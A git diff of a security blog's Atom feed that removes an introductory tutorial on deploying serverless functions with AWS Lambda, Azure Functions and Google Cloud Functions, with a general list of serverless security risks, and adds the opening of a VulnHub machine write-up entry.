+&lt;p class=&quot;lead&quot;&gt;Happy Hacking!&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="CloudSecurity" /><summary type="html">Most of the Serverless architecture are built with a motto of “Focus on the application, not the infrastructure and maintenance”</summary></entry><entry><title type="html">InfoSec Prep OSCP - Vuln Hub Machine</title><link href="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html" rel="alternate" type="text/html" title="InfoSec Prep OSCP - Vuln Hub Machine" /><published>2020-08-05T00:00:00+05:30</published><updated>2020-08-05T00:00:00+05:30</updated><id>http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP</id><content type="html" xml:base="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html">&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on Port 80&lt;/a&gt;&lt;/li&gt;
@@ -680,151 +922,4 @@ I transfered the compiled file of logrotten exploit to the box in /tmp directory
 
 &lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“There is no friend as loyal as a book.” - Ernest Hemingway</summary></entry><entry><title type="html">Serverless Computing in a Nutshell</title><link href="http://localhost:4000/blogs/cloudsecurity/serverless.html" rel="alternate" type="text/html" title="Serverless Computing in a Nutshell" /><published>2020-02-07T00:00:00+05:30</published><updated>2020-02-07T00:00:00+05:30</updated><id>http://localhost:4000/blogs/cloudsecurity/serverlesscomputing</id><content type="html" xml:base="http://localhost:4000/blogs/cloudsecurity/serverless.html">&lt;p class=&quot;lead&quot;&gt;Most of the Serverless architecture are built with a motto of &lt;strong&gt;&lt;em&gt;“Focus on the application, not the infrastructure and maintenance”&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#what-is-serverless-&quot; id=&quot;markdown-toc-what-is-serverless-&quot;&gt;What is serverless ?&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#popular-serverless-computing-providers&quot; id=&quot;markdown-toc-popular-serverless-computing-providers&quot;&gt;Popular Serverless Computing Providers&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#how-does-serverless-computing-works&quot; id=&quot;markdown-toc-how-does-serverless-computing-works&quot;&gt;How Does Serverless Computing Works?&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#things-serverless-computing-can-handle&quot; id=&quot;markdown-toc-things-serverless-computing-can-handle&quot;&gt;Things Serverless Computing can Handle&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#sample-use-case-scenario-of-serverless-computing&quot; id=&quot;markdown-toc-sample-use-case-scenario-of-serverless-computing&quot;&gt;Sample Use-Case Scenario of Serverless Computing&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#benefits-of-serverless-computing&quot; id=&quot;markdown-toc-benefits-of-serverless-computing&quot;&gt;Benefits of Serverless Computing:&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-aws-lambda&quot; id=&quot;markdown-toc-serverless-computing-using-aws-lambda&quot;&gt;Serverless Computing using AWS Lambda&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-azure-functions&quot; id=&quot;markdown-toc-serverless-computing-using-azure-functions&quot;&gt;Serverless Computing using Azure Functions&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-google-cloud-functions&quot; id=&quot;markdown-toc-serverless-computing-using-google-cloud-functions&quot;&gt;Serverless Computing using Google Cloud Functions&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#comparison&quot; id=&quot;markdown-toc-comparison&quot;&gt;Comparison&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#security-risks-in-serverless-computing&quot; id=&quot;markdown-toc-security-risks-in-serverless-computing&quot;&gt;Security Risks in Serverless Computing&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;what-is-serverless-&quot;&gt;What is serverless ?&lt;/h2&gt;
-&lt;p&gt;Serverless is a cloud computing execution model where the cloud provider dynamically manages the allocation and provisioning of servers (Load balancing). A serverless application runs in stateless compute containers that are event-triggered and its completely managed by the cloud provider itself.&lt;/p&gt;
-
-&lt;h3 id=&quot;popular-serverless-computing-providers&quot;&gt;Popular Serverless Computing Providers&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;AWS lambda&lt;/li&gt;
-  &lt;li&gt;Azure functions&lt;/li&gt;
-  &lt;li&gt;Google Cloud functions&lt;/li&gt;
-  &lt;li&gt;IBM OpenWhisk&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;how-does-serverless-computing-works&quot;&gt;How Does Serverless Computing Works?&lt;/h3&gt;
-&lt;p&gt;In a micro service architecture, monolithic applications are broken down into smaller services (F1,F2,F3) so you can develop, manage and scale them independently and FaaS (Function as a service) takes that step further by breaking applications to the level of functions and events.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Business person just need to write the business logic as code ( F1,F2,F3), it is loaded into the container for execution when request from the client triggers a particular function. After the execution in the container ,response is generated and delivered back to the client.&lt;/p&gt;
-
-&lt;h3 id=&quot;things-serverless-computing-can-handle&quot;&gt;Things Serverless Computing can Handle&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;Load Balancing&lt;/li&gt;
-  &lt;li&gt;Auto scaling&lt;/li&gt;
-  &lt;li&gt;Handling Failures&lt;/li&gt;
-  &lt;li&gt;Security Isolation&lt;/li&gt;
-  &lt;li&gt;OS Management&lt;/li&gt;
-  &lt;li&gt;Managing utilization&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;sample-use-case-scenario-of-serverless-computing&quot;&gt;Sample Use-Case Scenario of Serverless Computing&lt;/h2&gt;
-&lt;p&gt;When an image is uploaded into a Cloud Storage Service (such as S3), a Serverless function could automatically resize the image for mobile, tablet, desktop devices. The event that triggers the function is the file that has been uploaded to cloud storage. Serverless function then executes the function of resizing the image.&lt;/p&gt;
-
-&lt;h2 id=&quot;benefits-of-serverless-computing&quot;&gt;Benefits of Serverless Computing:&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Pay only when you use:&lt;/strong&gt;The user will be charged against the time that your functions were running (Paid according to no. of request received and Compute time) . Such architectures remove the need for the traditional ‘always on’ server system sitting behind an application, significantly reducing operational cost and complexity.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Easier Operational Management and Automatic Scaling:&lt;/strong&gt;Automatic scaling functionality of FaaS not only reduces computational cost but also reduces operational management overheads.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;Serverless Framework module:&lt;/strong&gt;The Serverless Framework consists of an open source CLI that makes it easy to develop, deploy and test serverless apps across different cloud providers, secure and monitor your serverless apps. This can be installed using the below command:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; serverless
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;serverless-computing-using-aws-lambda&quot;&gt;Serverless Computing using AWS Lambda&lt;/h2&gt;
-&lt;p class=&quot;lead&quot;&gt;Follow the below steps to deploy a simple serverless service using AWS Lambda&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Configure your CLI with the below command:
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless config credentials - provider aws - key &lt;span class=&quot;s2&quot;&gt;&quot;YOUR ACCOUNT KEY&quot;&lt;/span&gt; - secret &lt;span class=&quot;s2&quot;&gt;&quot; YOUR SECRET KEY&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Create a project folder for serverless computing with needed template.
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless create &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; aws-nodejs
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;It creates two files : &lt;strong&gt;handler.js&lt;/strong&gt; and &lt;strong&gt;serverless.yml&lt;/strong&gt;. &lt;strong&gt;serverless.yml&lt;/strong&gt; is like a configuration file for your handler file, &lt;strong&gt;handler.js&lt;/strong&gt; is like a function file where each function that are required are coded.&lt;/li&gt;
-  &lt;li&gt;Uncomment the needed event part in the serverless.yml .Here i am using the http event part
-&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/3.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;Run the command serverless deploy to deploy your instance.
-&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;serverless-computing-using-azure-functions&quot;&gt;Serverless Computing using Azure Functions&lt;/h2&gt;
-&lt;p class=&quot;lead&quot;&gt;Microsoft Azure allows the users to develop and run the serverless functions both on Cloud and Local environment. 
-Follow the below steps to deploy a simple serverless service using Azure Functions&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Run the following command from the command line to create a function app project. A github repository is also created with the same name.
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func init &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Select a worker runtime from the following language choices that will be prompted after creating the project:
-    &lt;ul&gt;
-      &lt;li&gt;.NET&lt;/li&gt;
-      &lt;li&gt;Node JS&lt;/li&gt;
-      &lt;li&gt;Powershell&lt;/li&gt;
-      &lt;li&gt;Python&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Navigate to the created project folder.
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Create an HTTP-triggered function using the following command:
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func new &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Function_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--template&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;HttpTrigger&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-    &lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;The following command starts the function app:
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func start
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Navigate to URL displayed, append the query string &lt;em&gt;?name={yourname}&lt;/em&gt; to the URL and execute the request.
-&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;serverless-computing-using-google-cloud-functions&quot;&gt;Serverless Computing using Google Cloud Functions&lt;/h2&gt;
-&lt;p&gt;Follow the below steps to deploy a simple serverless service using Google Cloud Functions&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Install serverless on your machine if not installed.
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; serverless
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Create a project folder for serverless computing with needed template.
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless create &lt;span class=&quot;nt&quot;&gt;--template&lt;/span&gt; google-nodejs &lt;span class=&quot;nt&quot;&gt;--path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;It creates three files: &lt;strong&gt;index.js&lt;/strong&gt;, &lt;strong&gt;package.json&lt;/strong&gt;, &lt;strong&gt;serverless.yml&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;Install all the dependencies
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Create the credential key for your project on Google Cloud Console, download the key and update the key path on serverless.yml&lt;/li&gt;
-  &lt;li&gt;Deploy the Serverless Instance
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless deploy
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;comparison&quot;&gt;Comparison&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/cloudsecurity/serverlesscomputing/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;security-risks-in-serverless-computing&quot;&gt;Security Risks in Serverless Computing&lt;/h2&gt;
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Function Event-Data Injection&lt;/strong&gt;: Serverless functions can consume input form different types of event sources. Various parts of these event sources may contain user-controlled or untrusted inputs that should be carefully inspected.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Broken Authentication&lt;/strong&gt;: Applications may contain dozens or even hundreds of functions. Applying robust authentication can easily go awry if not executed carefully.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Serverless Business Logic Manipulation&lt;/strong&gt;: Serverless applications are unique as they often follow the micro-services design and contain numerous functions chained together to form overall logic. Without proper enforcement, attackers may be able to tamper with intended logic.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Insecure Application  Secrets Storage&lt;/strong&gt;: In Serverless application secrets such as Credentials, API Key etc. may be stored in a plain text configuration file that may be accessible to the end user and in some cases these credentials will be in plain text, as environment variables.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Improper Exception Handling and Verbose Error Messages&lt;/strong&gt;: Serverless computing provides line-by-line debugging options for applications. As a result, developers frequently adopt the use of verbose error messages, which may leak sensitive data.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p class=&quot;lead&quot;&gt;Happy Hacking!&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="CloudSecurity" /><summary type="html">Most of the Serverless architecture are built with a motto of “Focus on the application, not the infrastructure and maintenance”</summary></entry></feed>
+&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“There is no friend as loyal as a book.” - Ernest Hemingway</summary></entry></feed>
